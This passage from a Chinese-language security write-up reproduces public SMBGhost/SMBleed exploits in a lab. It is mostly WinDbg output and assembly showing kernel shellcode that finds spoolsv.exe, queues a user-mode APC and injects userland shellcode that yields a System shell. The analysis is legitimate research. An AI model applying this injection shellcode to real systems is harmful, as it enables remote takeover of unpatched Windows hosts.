fffff780`00000912 4c29f0          sub     rax,r14
fffff780`00000915 483d00070000    cmp     rax,700h
fffff780`0000091b 77e6            ja      fffff780`00000903

kd&gt; dt _ethread @r14 -y ThreadListEntry 
nt!_ETHREAD
   +0x6b8 ThreadListEntry : _LIST_ENTRY [ 0xffffca8d`1382f6f8 - 0xffffca8d`1a0d36f8 ]

kd&gt; dq r9 l1
ffffca8d`1a0d2738  ffffca8d`1382f6f8

kd&gt; ? @r9-@r14
Evaluate expression: 1720 = 00000000`000006b8
```
- nt!PsGetCurrentProcess
通过nt!PsGetCurrentProcess获取当前线程所在进程的指针 （KPROCESS /<br>
EPRROCESS 地址），该指针存放在KTHREAD偏移0xB8处：通过KTHREAD偏移0x98访问ApcState；然后通过ApcState（KAPC_STATE结构）偏移0x20访问EPROCESS（KPROCESS）。

```
kd&gt; u rax
nt!PsGetCurrentProcess:
fffff800`4f5a9ca0 65488b042588010000 mov   rax,qword ptr gs:[188h]
fffff800`4f5a9ca9 488b80b8000000  mov     rax,qword ptr [rax+0B8h]
fffff800`4f5a9cb0 c3              ret

kd&gt; dt _kthread @rax
nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   ......
   +0x098 ApcState         : _KAPC_STATE

kd&gt; dx -id 0,0,ffffca8d10ea3340 -r1 (*((ntkrnlmp!_KAPC_STATE *)0xffffca8d1a0d2118))
(*((ntkrnlmp!_KAPC_STATE *)0xffffca8d1a0d2118))                 [Type: _KAPC_STATE]
    [+0x000] ApcListHead      [Type: _LIST_ENTRY [2]]
    [+0x020] Process          : 0xffffca8d10ea3340 [Type: _KPROCESS *]
    [+0x028] InProgressFlags  : 0x0 [Type: unsigned char]
```
<li>nt!PsGetProcessId<br>
通过nt!PsGetProcessId函数得到UniqueProcessId在EPROCESS结构中的偏移（0x2e8），然后通过加8定位到ActiveProcessLinks。通过遍历ActiveProcessLinks来访问不同进程的EPROCESS结构，通过比较EPROCESS中ImageFileName的散列值来寻找目标进程（”spoolsv.exe”）。</li>
```
kd&gt; g
Breakpoint 1 hit
fffff780`0000096e bf48b818b8      mov     edi,0B818B848h

kd&gt; dt _EPROCESS @rcx
nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
   +0x2e8 UniqueProcessId  : 0x00000000`0000074c Void
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffffca8d`179455f0 - 0xffffca8d`13fa15f0 ]
   ......
   +0x450 ImageFileName    : [15]  "spoolsv.exe"
```
<li>nt!PsGetProcessPeb &amp;&amp; nt!PsGetThreadTeb<br>
然后通过调用nt!PsGetProcessPeb，获取”spoolsv.exe”的PEB结构（偏移0x3f8处）并保存起来，然后通过ThreadListHead遍历ThreadListEntry，以寻找一个Queue不为0的KTHREAD（可通过nt!PsGetThreadTeb函数获取TEB结构在KTHREAD结构中的偏移，然后减8得到Queue）。</li>
```
kd&gt; dt _EPROCESS @rcx
nt!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x2e0 ProcessLock      : _EX_PUSH_LOCK
   +0x2e8 UniqueProcessId  : 0x00000000`0000074c Void
   +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffffca8d`179455f0 - 0xffffca8d`13fa15f0 ]
   ......
   +0x3f8 Peb              : 0x00000000`00360000 _PEB
   ......
   +0x488 ThreadListHead   : _LIST_ENTRY [ 0xffffca8d`18313738 - 0xffffca8d`178e9738 ]

kd&gt; dt _kTHREAD @rdx
nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x3b5dc10
   +0x028 InitialStack     : 0xfffffe80`76556c90 Void
   +0x030 StackLimit       : 0xfffffe80`76551000 Void
   +0x038 StackBase        : 0xfffffe80`76557000 Void
   ......
   +0x0e8 Queue            : 0xffffca8d`1307d180 _DISPATCHER_HEADER
   +0x0f0 Teb              : 0x00000000`00387000 Void

kd&gt; r rdx    //目标KTHREAD
rdx=ffffca8d178e9080

kd&gt; dt _ETHREAD @rdx   //感觉这个没啥用，先留着
nt!_ETHREAD
   +0x000 Tcb              : _KTHREAD
   ......
   +0x6b8 ThreadListEntry  : _LIST_ENTRY [ 0xffffca8d`18cbe6c8 - 0xffffca8d`16d2e738 ]

```

### <a class="reference-link" name="%E5%90%91%E7%9B%AE%E6%A0%87%E7%BA%BF%E7%A8%8B%E6%8F%92%E5%85%A5APC%E5%AF%B9%E8%B1%A1"></a>向目标线程插入APC对象
<li>nt!KeInitializeApc<br>
通过调用nt!KeInitializeApc函数来初始化APC对象（KAPC类型)。如下所示，第一个参数指明了待初始化的APC对象，第二个参数关联上面的kTHREAD结构，第四个参数为KernelApcRoutine函数指针，第七个参数指明了UserMode：</li>
```
; KeInitializeApc(PKAPC,    //0xfffff78000000e30
    ;                 PKTHREAD,     //0xffffca8d178e9080
    ;                 KAPC_ENVIRONMENT = OriginalApcEnvironment (0),
    ;                 PKKERNEL_ROUTINE = kernel_apc_routine,  //0xfffff78000000a62
    ;                 PKRUNDOWN_ROUTINE = NULL,
    ;                 PKNORMAL_ROUTINE = userland_shellcode,  ;fffff780`00000e00
    ;                 KPROCESSOR_MODE = UserMode (1),
    ;                 PVOID Context);   ;fffff780`00000e00
    lea rcx, [rbp+DATA_KAPC_OFFSET]     ; PAKC
    xor r8, r8      ; OriginalApcEnvironment
    lea r9, [rel kernel_kapc_routine]    ; KernelApcRoutine
    push rbp    ; context
    push 1      ; UserMode
    push rbp    ; userland shellcode (MUST NOT be NULL) 
    push r8     ; NULL
    sub rsp, 0x20   ; shadow stack
    mov edi, KEINITIALIZEAPC_HASH
    call win_api_direct

//初始化后的KAPC结构
kd&gt; dt _kapc fffff78000000e30
nt!_KAPC
   +0x000 Type             : 0x12 ''
   +0x001 SpareByte0       : 0 ''
   +0x002 Size             : 0x58 'X'
   +0x003 SpareByte1       : 0 ''
   +0x004 SpareLong0       : 0
   +0x008 Thread           : 0xffffca8d`178e9080 _KTHREAD
   +0x010 ApcListEntry     : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]
   +0x020 KernelRoutine    : 0xfffff780`00000a62     void  +fffff78000000a62
   +0x028 RundownRoutine   : (null) 
   +0x030 NormalRoutine    : 0xfffff780`00000e00     void  +fffff78000000e00
   +0x020 Reserved         : [3] 0xfffff780`00000a62 Void
   +0x038 NormalContext    : 0xfffff780`00000e00 Void
   +0x040 SystemArgument1  : (null) 
   +0x048 SystemArgument2  : (null) 
   +0x050 ApcStateIndex    : 0 ''
   +0x051 ApcMode          : 1 ''
   +0x052 Inserted         : 0 ''

kd&gt; u 0xfffff780`00000a62    //KernelRoutine
fffff780`00000a62 55              push    rbp
fffff780`00000a63 53              push    rbx
fffff780`00000a64 57              push    rdi
fffff780`00000a65 56              push    rsi
fffff780`00000a66 4157            push    r15
fffff780`00000a68 498b28          mov     rbp,qword ptr [r8]
fffff780`00000a6b 4c8b7d08        mov     r15,qword ptr [rbp+8]
fffff780`00000a6f 52              push    rdx
```
- nt!KeInsertQueueApc然后通过nt!KeInsertQueueApc函数将初始化后的APC对象存放到目标线程的APC队列中。
```
; BOOLEAN KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, 0);
    ;   SystemArgument1 is second argument in usermode code (rdx)
    ;   SystemArgument2 is third argument in usermode code (r8)
    lea rcx, [rbp+DATA_KAPC_OFFSET]
    ;xor edx, edx   ; no need to set it here
    ;xor r8, r8     ; no need to set it here
    xor r9, r9
    mov edi, KEINSERTQUEUEAPC_HASH
    call win_api_direct

kd&gt; dt _kapc fffff78000000e30
nt!_KAPC
   +0x000 Type             : 0x12 ''
   +0x001 SpareByte0       : 0 ''
   +0x002 Size             : 0x58 'X'
   +0x003 SpareByte1       : 0 ''
   +0x004 SpareLong0       : 0
   +0x008 Thread           : 0xffffca8d`178e9080 _KTHREAD
   +0x010 ApcListEntry     : _LIST_ENTRY [ 0xffffca8d`178e9128 - 0xffffca8d`178e9128 ]
   +0x020 KernelRoutine    : 0xfffff780`00000a62     void  +fffff78000000a62
   +0x028 RundownRoutine   : (null) 
   +0x030 NormalRoutine    : 0xfffff780`00000e00     void  +fffff78000000e00
   +0x020 Reserved         : [3] 0xfffff780`00000a62 Void
   +0x038 NormalContext    : 0xfffff780`00000e00 Void
   +0x040 SystemArgument1  : 0x0000087f`fffff200 Void
   +0x048 SystemArgument2  : (null) 
   +0x050 ApcStateIndex    : 0 ''
   +0x051 ApcMode          : 1 ''
   +0x052 Inserted         : 0x1 ''
```

然后判断KAPC.ApcListEntry中UserApcPending比特位是否被设置，如果成功，就等待目标线程获得权限，执行APC例程，执行KernelApcRoutine函数。

```
mov rax, [rbp+DATA_KAPC_OFFSET+0x10]     ; get KAPC.ApcListEntry
    ; EPROCESS pointer 8 bytes
    ; InProgressFlags 1 byte
    ; KernelApcPending 1 byte
    ; * Since Win10 R5:
    ;   Bit 0: SpecialUserApcPending
    ;   Bit 1: UserApcPending
    ; if success, UserApcPending MUST be 1
    test byte [rax+0x1a], 2
    jnz _insert_queue_apc_done

kd&gt; p
fffff780`000009e7 f6401a02        test    byte ptr [rax+1Ah],2

kd&gt; dt _kapc fffff78000000e30
nt!_KAPC
   +0x000 Type             : 0x12 ''
   +0x001 SpareByte0       : 0 ''
   +0x002 Size             : 0x58 'X'
   +0x003 SpareByte1       : 0 ''
   +0x004 SpareLong0       : 0
   +0x008 Thread           : 0xffffca8d`178e9080 _KTHREAD
   +0x010 ApcListEntry     : _LIST_ENTRY [ 0xffffca8d`178e9128 - 0xffffca8d`178e9128 ]

kd&gt; dx -id 0,0,ffffca8d10ea3340 -r1 (*((ntkrnlmp!_LIST_ENTRY *)0xfffff78000000e40))
(*((ntkrnlmp!_LIST_ENTRY *)0xfffff78000000e40))                 [Type: _LIST_ENTRY]
    [+0x000] Flink            : 0xffffca8d178e9128 [Type: _LIST_ENTRY *]
    [+0x008] Blink            : 0xffffca8d178e9128 [Type: _LIST_ENTRY *]

kd&gt; db rax l1a+1
ffffca8d`178e9128  40 0e 00 00 80 f7 ff ff-40 0e 00 00 80 f7 ff ff  @.......@.......
ffffca8d`178e9138  40 e2 cb 18 8d ca ff ff-00 00 02                 @..........
```

### <a class="reference-link" name="KernelApcRoutine%E5%87%BD%E6%95%B0"></a>KernelApcRoutine函数

在这个函数里先将IRQL设置为PASSIVE_LEVEL（通过在KernelApcRoutine中将cr8置0），以便调用ZwAllocateVirtualMemory函数。
<li>申请空间并复制用户态Shellcode<br>
调用ZwAllocateVirtualMemory(-1, &amp;baseAddr, 0, &amp;0x1000, 0x1000, 0x40)分配内存，然后将用户态Shellcode复制过去。如下所示，分配到的地址为bc0000。</li>
```
kd&gt; dd rdx l1
fffffe80`766458d0  00000000
kd&gt; dd fffffe80`766458d0 l1    //baseAddr
fffffe80`766458d0  00bc0000

kd&gt; u rip  //将用户模式代码复制到bc0000处：
fffff780`00000aa5 488b3e          mov     rdi,qword ptr [rsi]
fffff780`00000aa8 488d354d000000  lea     rsi,[fffff780`00000afc]
fffff780`00000aaf b980030000      mov     ecx,380h
fffff780`00000ab4 f3a4            rep movs byte ptr [rdi],byte ptr [rsi]

kd&gt; u bc0000
00000000`00bc0000 4892            xchg    rax,rdx
00000000`00bc0002 31c9            xor     ecx,ecx
00000000`00bc0004 51              push    rcx
00000000`00bc0005 51              push    rcx
00000000`00bc0006 4989c9          mov     r9,rcx
00000000`00bc0009 4c8d050d000000  lea     r8,[00000000`00bc001d]
00000000`00bc0010 89ca            mov     edx,ecx
00000000`00bc0012 4883ec20        sub     rsp,20h

```
<li>查找kernel32模块<br>
思路是通过遍历之前找到的”spoolsv.exe”的PEB结构中的Ldr-&gt;InMemoryOrderModuleList-&gt;Flink，找到kernel32模块（unicode字符串特征比对）。<br>
PEB偏移0x18为_PEB_LDR_DATA结构的Ldr ，其偏移0x20处为一个_LIST_ENTRY结构的InMemoryOrderModuleList，_LIST_ENTRY结构中包含flink和blink指针，通过遍历flink指针可以查询不同模块的LDR_DATA_TABLE_ENTRY结构。</li>
```
1: kd&gt; dt _peb @rax
nt!_PEB
   +0x000 InheritedAddressSpace : 0 ''
   +0x001 ReadImageFileExecOptions : 0 ''
   +0x002 BeingDebugged    : 0 ''
   +0x003 BitField         : 0x4 ''
   +0x003 ImageUsesLargePages : 0y0
   +0x003 IsProtectedProcess : 0y0
   +0x003 IsImageDynamicallyRelocated : 0y1
   +0x003 SkipPatchingUser32Forwarders : 0y0
   +0x003 IsPackagedProcess : 0y0
   +0x003 IsAppContainer   : 0y0
   +0x003 IsProtectedProcessLight : 0y0
   +0x003 IsLongPathAwareProcess : 0y0
   +0x004 Padding0         : [4]  ""
   +0x008 Mutant           : 0xffffffff`ffffffff Void
   +0x010 ImageBaseAddress : 0x00007ff7`94970000 Void
   +0x018 Ldr              : 0x00007fff`ea7a53c0 _PEB_LDR_DATA
   +0x020 ProcessParameters : 0x00000000`012c1bc0 _RTL_USER_PROCESS_PARAMETERS
   +0x028 SubSystemData    : (null) 
   +0x030 ProcessHeap      : 0x00000000`012c0000 Void
   ......
1: kd&gt; dx -id 0,0,ffff818c698db380 -r1 ((ntkrnlmp!_PEB_LDR_DATA *)0x7fffea7a53c0)
((ntkrnlmp!_PEB_LDR_DATA *)0x7fffea7a53c0)                 : 0x7fffea7a53c0 [Type: _PEB_LDR_DATA *]
    [+0x000] Length           : 0x58 [Type: unsigned long]
    [+0x004] Initialized      : 0x1 [Type: unsigned char]
    [+0x008] SsHandle         : 0x0 [Type: void *]
    [+0x010] InLoadOrderModuleList [Type: _LIST_ENTRY]
    [+0x020] InMemoryOrderModuleList [Type: _LIST_ENTRY]
    [+0x030] InInitializationOrderModuleList [Type: _LIST_ENTRY]
    [+0x040] EntryInProgress  : 0x0 [Type: void *]
    [+0x048] ShutdownInProgress : 0x0 [Type: unsigned char]
    [+0x050] ShutdownThreadId : 0x0 [Type: void *]
1: kd&gt; dx -id 0,0,ffff818c698db380 -r1 (*((ntkrnlmp!_LIST_ENTRY *)0x7fffea7a53e0))
(*((ntkrnlmp!_LIST_ENTRY *)0x7fffea7a53e0))                 [Type: _LIST_ENTRY]
    [+0x000] Flink            : 0x12c2580 [Type: _LIST_ENTRY *]
    [+0x008] Blink            : 0x1363920 [Type: _LIST_ENTRY *]
```

LDR_DATA_TABLE_ENTRY结构偏移0x30处为模块基址，偏移0x58处为BaseDllName，其起始处为模块名的unicode长度（两个字节），偏移0x8处为该模块的unicode字符串。通过长度和字符串这两个特征可以定位kernel32模块，并通过DllBase字段获取基址。在实际操作中需要计算这些地址相对于InMemoryOrderLinks的偏移。

```
1: kd&gt; dt _LDR_DATA_TABLE_ENTRY 0x12c2b00
nt!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000000`012c30f0 - 0x00000000`012c23e0 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000000`012c3100 - 0x00000000`012c23f0 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000000`012c45b0 - 0x00000000`012c3110 ]
   +0x030 DllBase          : 0x00007fff`e8ab0000 Void
   +0x038 EntryPoint       : 0x00007fff`e8ac7c70 Void
   +0x040 SizeOfImage      : 0xb2000
   +0x048 FullDllName      : _UNICODE_STRING "C:\Windows\System32\KERNEL32.DLL"
   +0x058 BaseDllName      : _UNICODE_STRING "KERNEL32.DLL"

1: kd&gt; dx -id 0,0,ffff818c698db380 -r1 -nv (*((ntkrnlmp!_UNICODE_STRING *)0x12c2b58))
(*((ntkrnlmp!_UNICODE_STRING *)0x12c2b58))                 : "KERNEL32.DLL" [Type: _UNICODE_STRING]
    [+0x000] Length           : 0x18 [Type: unsigned short]
    [+0x002] MaximumLength    : 0x1a [Type: unsigned short]
    [+0x008] Buffer           : 0x12c2cb8 : "KERNEL32.DLL" [Type: wchar_t *]
```

然后在kernel32模块的导出表中寻找CreateThread函数，然后将其保存至KernelApcRoutine函数的参数SystemArgument1中，传送给userland_start_thread。

```
; save CreateThread address to SystemArgument1
mov [rbx], rax

kd&gt; dq rbx l1
fffffe80`766458e0  00000000`00001000

kd&gt; p
fffff780`00000aea 31c9            xor     ecx,ecx

kd&gt; dq fffffe80`766458e0 l1
fffffe80`766458e0  00007ffa`d229a810

kd&gt; u 7ffa`d229a810
KERNEL32!CreateThreadStub:
00007ffa`d229a810 4c8bdc          mov     r11,rsp
00007ffa`d229a813 4883ec48        sub     rsp,48h
00007ffa`d229a817 448b542470      mov     r10d,dword ptr [rsp+70h]
00007ffa`d229a81c 488b442478      mov     rax,qword ptr [rsp+78h]
00007ffa`d229a821 4181e204000100  and     r10d,10004h
00007ffa`d229a828 498943f0        mov     qword ptr [r11-10h],rax
00007ffa`d229a82c 498363e800      and     qword ptr [r11-18h],0
00007ffa`d229a831 458953e0        mov     dword ptr [r11-20h],r10d

```

然后将QUEUEING_KAPC置0，将IRQL 恢复至APC_LEVEL。

```
_kernel_kapc_routine_exit:
    xor ecx, ecx
    ; clear queueing kapc flag, allow other hijacked system call to run shellcode
    mov byte [rbp+DATA_QUEUEING_KAPC_OFFSET], cl
    ; restore IRQL to APC_LEVEL
    mov cl, 1
    mov cr8, rcx
```

### <a class="reference-link" name="%E7%94%A8%E6%88%B7%E6%80%81Shellcode"></a>用户态Shellcode

最终成功运行到用户模式Shellcode，用户模式代码包含userland_start_thread和功能Shellcode（userland_payload），在userland_start_thread中通过调用CreateThread函数去执行功能Shellcode。userland_payload这里不再介绍。

```
userland_start_thread:
    ; CreateThread(NULL, 0, &amp;threadstart, NULL, 0, NULL)
    xchg rdx, rax   ; rdx is CreateThread address passed from kernel
    xor ecx, ecx    ; lpThreadAttributes = NULL
    push rcx        ; lpThreadId = NULL
    push rcx        ; dwCreationFlags = 0
    mov r9, rcx     ; lpParameter = NULL
    lea r8, [rel userland_payload]  ; lpStartAddr
    mov edx, ecx    ; dwStackSize = 0
    sub rsp, 0x20
    call rax
    add rsp, 0x30
    ret

userland_payload:
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52......"

kd&gt; u r8
00000000`00bc001d fc              cld
00000000`00bc001e 4883e4f0        and     rsp,0FFFFFFFFFFFFFFF0h
00000000`00bc0022 e8c0000000      call    00000000`00bc00e7
00000000`00bc0027 4151            push    r9
00000000`00bc0029 4150            push    r8
00000000`00bc002b 52              push    rdx
00000000`00bc002c 51              push    rcx
00000000`00bc002d 56              push    rsi
```



### **总结~**

本文对公开的关于 SMBGhost 和 SMBleed 漏洞的几种利用思路进行跟进，逆向了一些关键结构和算法特性，最终在实验环境下拿到了System Shell。非常感谢 blackwhite 和 zcgonvh 两位师傅，在此期间给予的指导和帮助，希望有天能像他们一样优秀。最后放上两种利用思路的复现结果：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0177dc15ac3920d85e.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01764ce9264cd57fe8.png)



## 参考文献
- [https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796)
- [https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1206](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1206)
- [https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html](https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html)
- [https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/](https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/)
- [https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-part-ii-unauthenticated-memory-read-preparing-the-ground-for-an-rce/](https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-part-ii-unauthenticated-memory-read-preparing-the-ground-for-an-rce/)
- [https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-part-iii-from-remote-read-smbleed-to-rce/](https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-part-iii-from-remote-read-smbleed-to-rce/)
- [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e7046961-3318-4350-be2a-a8d69bb59ce8](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/e7046961-3318-4350-be2a-a8d69bb59ce8)
- [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/f1d9b40d-e335-45fc-9d0b-199a31ede4c3](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/f1d9b40d-e335-45fc-9d0b-199a31ede4c3)
- [https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf](https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf)
- [https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q](https://mp.weixin.qq.com/s/rKJdP_mZkaipQ9m0Qn9_2Q)
- [https://mp.weixin.qq.com/s/71c6prw14AWYYJXf4-QXMA](https://mp.weixin.qq.com/s/71c6prw14AWYYJXf4-QXMA)
- [https://mp.weixin.qq.com/s/hUi0z37dbF9o06kKf8gQyw](https://mp.weixin.qq.com/s/hUi0z37dbF9o06kKf8gQyw)